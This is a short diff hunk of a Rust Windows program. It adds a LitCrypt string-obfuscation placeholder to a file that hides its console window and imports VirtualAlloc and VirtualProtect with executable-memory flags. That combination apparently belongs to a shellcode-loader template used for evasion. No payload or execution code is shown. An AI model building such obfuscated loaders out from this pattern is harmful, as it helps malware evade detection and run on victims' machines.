@@ -1,6 +1,8 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
+{{LITCRYPT_SETUP}}
+
 use std::ptr::{null, null_mut};
 
 use windows_sys::Win32::{System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::{
